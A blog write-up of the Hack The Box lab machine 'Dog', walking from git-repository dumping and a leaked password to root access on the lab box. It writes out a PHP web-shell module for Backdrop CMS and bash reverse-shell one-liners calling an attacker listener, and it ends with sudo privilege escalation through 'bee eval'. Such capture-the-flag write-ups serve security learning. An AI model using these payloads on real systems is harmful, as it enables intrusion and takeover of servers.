---
title: 'HTB Dog Writeup'
date: 2025-07-15
permalink: /posts/2025/07/HTB_Dog_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Dog" with easy difficulty

# HTB_Dog

Hi, welcome to this writeup of the Hack the Box machine Dog with easy difficulty.

![image.png](/images/HTB_Dog/image.png)

`nmap -sV -sC 10.10.11.58`

![image.png](/images/HTB_Dog/image%201.png)

Port 22 and 80 are open. On port 80 looks like a repository server.

The url for this repo is `http://10.10.11.58/.git/` as we can see.

![image.png](/images/HTB_Dog/image%202.png)

The nmap scan also showed us a bunch of directories from the robots.txt. Let’s go trough these and see if we cant find anything.

The site is a dog website btw:

![image.png](/images/HTB_Dog/image%203.png)

There can be logged in at: `http://10.10.11.58/?q=user/login`

When changing the `?q=user`  to admin I get this:

![image.png](/images/HTB_Dog/image%204.png)

So this does something.

Earlier i saw a log with the user in it: `dog@dog.htb`

There is a strange encoded string in the `http://10.10.11.58/.git/refs/heads/master`
`8204779c764abd4c9d8d95038b6d22b6a7515afa` 

While exploring the folders, I found that there is a `settings.php` page in the root folder. Entering this in the browser gives me a blank page. 

Let’s try to download this file with git-dumper

`pip install git-dumper`

I got a permissions error in my python venv

`sudo chown -R kali:kali /home/kali/HTB/Dog/dog`

`source /home/kali/HTB/Dog/dog/bin/activate
pip install --upgrade pip setuptools wheel
pip install git-dumper` 

Now we can use the git-dumper tool with:

`git-dumper http://10.10.11.58/.git ~/dumped_repo`

The folder `/dumped_repo` has to be already present

Now we can go into this dumped folder: `cd ~/website`

`cat settings.php`

![image.png](/images/HTB_Dog/image%205.png)

BackDropJ2024DS2024

Now we have a password but we don’t know the user this belongs to

There can be a test user: `test_username`

Or `backdrop`  found in the filetransfer.test with the password `password`

Or `Tiffany` in the database_test.txt file

![image.png](/images/HTB_Dog/image%206.png)

Yes we are logged in.

There are more users:

![image.png](/images/HTB_Dog/image%207.png)

There is a module upload functionality we can use to upload a malicious file to gain shell.

The structure of a Backdrop module is like this:

dogshell/
├── dogshell.info
└── dogshell.module

```php
dogshell.info

name = DogShell
description = Backdoor shell access
type = module
backdrop = 1.x
package = Administration
version = 1.0
```

```php
<?php
function dogshell_menu() {
  $items = array();
  $items['dogs'] = array(
    'title' => 'Dog Shell',
    'page callback' => 'dogs_eval',
    'access callback' => TRUE,
  );
  return $items;
}

function dogs_eval() {
  if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
  } else {
    echo "Use ?q=dogs&cmd=whoami";
  }
}
?>
```

Package this folder as .tar.gz

`tar -czf dogshell.tar.gz dogshell/`

![image.png](/images/HTB_Dog/image%208.png)

![image.png](/images/HTB_Dog/image%209.png)

![image.png](/images/HTB_Dog/image%2010.png)

Now enable this module.

And now test our own module: 

`http://10.10.11.58/?q=dogs&cmd=id` 

![image.png](/images/HTB_Dog/image%2011.png)

Haha yes it works.

Now let’s reverse shell:

`http://10.10.11.58/?q=dogs&cmd=bash+-c+'bash+-i+&+/dev/tcp/10.10.14.91/6666+0>&1'>`

With a nc listener: `nc -lvnp 6666`

Hmm this did not work.

I found this exploit: https://www.exploit-db.com/exploits/52021

Let’s copy this python code to a file on our machine and run it with:

`python3 exploit.py http://dog.htb`

![image.png](/images/HTB_Dog/image%2012.png)

Now there is a folder names shell

`tar -czvf shell.tar.gz shell` 

![image.png](/images/HTB_Dog/image%2013.png)

Now upload this module once again.

Now go to this url (the shell address):

http://dog.htb/modules/shell/shell.php

![image.png](/images/HTB_Dog/image%2014.png)

Now get a reverse shell: `bash -c "bash -i >& /dev/tcp/10.10.14.91/1234 0>&1"`

![image.png](/images/HTB_Dog/image%2015.png)

`python3 -c 'import pty;pty.spawn("/bin/bash")'<ll$ python3 -c 'import pty; pty.spawn("/bin/bash")’`

`export TERM=xterm` 

`^z`

`stty raw -echo; fg`

![image.png](/images/HTB_Dog/image%2016.png)

![image.png](/images/HTB_Dog/image%2017.png)

We now know the username

I got SSH with `ssh johncusack@10.10.11.58`  and the password we got earlier.

The user flag is in: `/home/johncusack/user.txt` 

# Privilege Escalation

Let’s check the sudo privileges with: `sudo -l`

![image.png](/images/HTB_Dog/image%2018.png)

This is interesting the `/usr/local/bin/bee` dir can run commands.

Bee is a program. Using `ls -l` shows us the permissions.

![image.png](/images/HTB_Dog/image%2019.png)

This is a symlink to `/backdrop_tool/bee/bee.php` . 

`ls -l /backdrop_tool/bee/bee.php` to look at there permissions.

We can take a look inside this file: `cat /backdrop_tool/bee/bee.php`

Bee is a command line utility for Backdrop CMS apparently.

Bee uses the PHP function `system()`  to run commands as root.

You can run this command to see if you can run commands as root on this path:

`sudo /usr/local/bin/bee --root=/var/www/html eval "echo
shell_exec('whoami && id');"`

![image.png](/images/HTB_Dog/image%2020.png)

And yes we can.

Now we start a root shell with: `sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"`

Now going to `/root` we have a nice `root.txt` file

![image.png](/images/HTB_Dog/image%2021.png)